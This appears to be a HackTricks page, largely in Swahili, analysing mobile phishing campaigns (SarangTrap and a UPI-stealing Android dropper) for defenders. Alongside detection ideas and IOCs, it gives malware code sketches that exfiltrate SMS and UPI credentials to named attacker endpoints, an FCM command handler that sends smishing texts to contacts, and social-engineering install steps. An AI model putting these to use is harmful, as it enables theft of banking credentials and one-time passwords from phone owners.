# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ukurasa huu unashughulikia mbinu zinazotumiwa na wahalifu kusambaza **malicious Android APKs** na **iOS mobile-configuration profiles** kupitia phishing (SEO, uhandisi wa kijamii, maduka ya uwongo, programu za uchumba, n.k.).
> Nyenzo hii imebadilishwa kutoka kwa kampeni ya SarangTrap iliyofichuliwa na Zimperium zLabs (2025) na utafiti mwingine wa umma.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Jisajili majina ya kikoa yanayofanana (uchumba, kushiriki wingu, huduma za magari…).
– Tumia maneno muhimu ya lugha ya ndani na emojis katika kipengele cha `<title>` ili kuorodheshwa kwenye Google.
– Weka *zote* maelekezo ya usakinishaji ya Android (`.apk`) na iOS kwenye ukurasa mmoja wa kutua.
2. **First Stage Download**
* Android: kiungo cha moja kwa moja kwa APK *isiyosainiwa* au “maduka ya wahusika wengine”.
* iOS: `itms-services://` au kiungo cha HTTPS wazi kwa profaili ya **mobileconfig** mbaya (angalia hapa chini).
3. **Post-install Social Engineering**
* Katika matumizi ya kwanza, programu inahitaji **nambari ya mwaliko / uthibitisho** (dhana ya ufikiaji wa kipekee).
* Nambari hiyo inatumwa **POST kupitia HTTP** kwa Command-and-Control (C2).
* C2 inajibu `{"success":true}` ➜ malware inaendelea.
* Uchambuzi wa dynamic wa Sandbox / AV ambao hauwasilishi nambari halali unaona **hakuna tabia mbaya** (kuepuka).
4. **Runtime Permission Abuse** (Android)
* Ruhusa hatari zinahitajiwa tu **baada ya majibu chanya kutoka C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Mifano ya zamani pia ilihitaji ruhusa za SMS -->
```
* Mifano ya hivi karibuni **ondoa `<uses-permission>` kwa SMS kutoka `AndroidManifest.xml`** lakini inacha njia ya msimbo wa Java/Kotlin inayosoma SMS kupitia reflection ⇒ inapunguza alama ya static wakati bado inafanya kazi kwenye vifaa vinavyotoa ruhusa kupitia unyanyasaji wa `AppOps` au malengo ya zamani.
5. **Facade UI & Background Collection**
* Programu inaonyesha maoni yasiyo na madhara (mtazamaji wa SMS, mchaguo wa picha) iliyotekelezwa kwa ndani.
* Wakati huo inachukua:
- IMEI / IMSI, nambari ya simu
- Dump kamili ya `ContactsContract` (array ya JSON)
- JPEG/PNG kutoka `/sdcard/DCIM` iliyoshinikizwa na [Luban](https://github.com/Curzibn/Luban) ili kupunguza ukubwa
- Maudhui ya SMS ya hiari (`content://sms`)
Payloads ni **batch-zipped** na kutumwa kupitia `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* Profaili moja ya **mobile-configuration** inaweza kuomba `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` n.k. kujiandikisha kifaa katika usimamizi kama “MDM”.
* Maagizo ya uhandisi wa kijamii:
1. Fungua Mipangilio ➜ *Profaili imeshushwa*.
2. Bonyeza *Sakinisha* mara tatu (picha za skrini kwenye ukurasa wa phishing).
3. Amini profaili isiyosainiwa ➜ mshambuliaji anapata *Contacts* & *Photo* haki bila ukaguzi wa Duka la Programu.
7. **Network Layer**
* HTTP wazi, mara nyingi kwenye bandari 80 na kichwa cha HOST kama `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (hakuna TLS → rahisi kugundua).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – Wakati wa tathmini ya malware, otomatisha awamu ya nambari ya mwaliko kwa Frida/Objection ili kufikia tawi la mbaya.
* **Manifest vs. Runtime Diff** – Linganisha `aapt dump permissions` na `PackageManager#getRequestedPermissions()` wakati wa runtime; kukosekana kwa ruhusa hatari ni bendera nyekundu.
* **Network Canary** – Sanidi `iptables -p tcp --dport 80 -j NFQUEUE` kugundua milipuko isiyo thabiti ya POST baada ya kuingiza nambari.
* **mobileconfig Inspection** – Tumia `security cms -D -i profile.mobileconfig` kwenye macOS kuorodhesha `PayloadContent` na kugundua haki nyingi.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** ili kukamata milipuko ya ghafla ya majina ya kikoa yenye maneno muhimu.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` kutoka kwa wateja wa Dalvik nje ya Google Play.
* **Invite-code Telemetry** – POST ya nambari za nambari za 6–8 mara tu baada ya usakinishaji wa APK inaweza kuashiria hatua ya maandalizi.
* **MobileConfig Signing** – Zuia profaili za usanidi zisizosainiwa kupitia sera ya MDM.

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Ishara (Kawaida)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Mwelekeo huu umeonekana katika kampeni zinazotumia mada za manufaa ya serikali kuiba akidi za UPI za India na OTPs. Opereta wanachanganya majukwaa maarufu kwa ajili ya usambazaji na uimara.

### Mnyororo wa usambazaji kupitia majukwaa ya kuaminika
- YouTube video lure → maelezo yana kiungo kifupi
- Shortlink → GitHub Pages phishing site inayofanana na lango halali
- Reposi hiyo hiyo ya GitHub inahifadhi APK yenye alama ya uongo ya “Google Play” inayounganisha moja kwa moja na faili
- Kurasa za phishing za dynamic zinaishi kwenye Replit; channel ya amri ya mbali inatumia Firebase Cloud Messaging (FCM)

### Dropper yenye payload iliyojumuishwa na usakinishaji wa offline
- APK ya kwanza ni installer (dropper) inayosafirisha malware halisi kwenye `assets/app.apk` na inamwambia mtumiaji kuzima Wi‑Fi/data ya simu ili kupunguza ugunduzi wa wingu.
- Payload iliyojumuishwa inasakinishwa chini ya jina lisilo na hatari (mfano, “Secure Update”). Baada ya usakinishaji, installer na payload zote zinapatikana kama programu tofauti.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Ugunduzi wa mwisho wa dinamik kupitia kiungo kifupi
- Malware inapata orodha ya maandiko ya maandiko, iliyotenganishwa kwa koma ya mwisho hai kutoka kwa kiungo kifupi; mabadiliko rahisi ya maandiko yanazalisha njia ya mwisho ya ukurasa wa phishing. 

Mfano (iliyosafishwa):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-code:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Hatua ya “Fanya malipo ya ₹1 / UPI‑Lite” inachukua fomu ya HTML ya mshambuliaji kutoka kwa kiunganishi cha dinamik ndani ya WebView na inakamata maeneo nyeti (simu, benki, UPI PIN) ambayo yanatumwa kwa `POST` kwa `addup.php`.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Kujitangaza na kukamata SMS/OTP
- Ruhusa za nguvu zinahitajika kwenye matumizi ya kwanza:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Mawasiliano yanapigwa ili kutuma ujumbe wa smishing kwa wingi kutoka kwa kifaa cha mwathirika.
- SMS zinazokuja zinakamatwa na mpokeaji wa matangazo na kupakiwa na metadata (mjumbe, mwili, sloti ya SIM, kitambulisho cha nasibu cha kifaa) hadi `/addsm.php`.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) kama C2 yenye uvumilivu
- Payload inajiandikisha kwa FCM; ujumbe wa kusukuma hubeba uwanja wa `_type` unaotumika kama swichi kuanzisha vitendo (mfano, sasisha mifano ya maandiko ya ulaghai, badilisha tabia).

Mfano wa payload ya FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Mchoro wa mpangilio:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Hunting patterns and IOCs
- APK ina payload ya pili kwenye `assets/app.apk`
- WebView inachukua malipo kutoka `gate.htm` na kuhamasisha kwa `/addup.php`
- Uhamasishaji wa SMS kwa `/addsm.php`
- Upataji wa config unaoendeshwa na shortlink (mfano, `rebrand.ly/*`) ukirudisha mwisho wa CSV
- Apps zilizoandikwa kama "Update/Secure Update" za kawaida
- FCM `data` ujumbe wenye mtabo wa `_type` katika apps zisizoaminika

### Detection & defence ideas
- Flag apps ambazo zinaelekeza watumiaji kuzima mtandao wakati wa usakinishaji na kisha kuhamasisha APK ya pili kutoka `assets/`.
- Onya kuhusu tuple ya ruhusa: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + michakato ya malipo ya WebView.
- Ufuatiliaji wa egress kwa `POST /addup.php|/addsm.php` kwenye mwenyeji wasio wa kampuni; zuia miundombinu inayojulikana.
- Kanuni za Mobile EDR: app isiyoaminika inajiandikisha kwa FCM na kujiunga kwenye uwanja wa `_type`.

---

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)

{{#include ../../banners/hacktricks-training.md}}
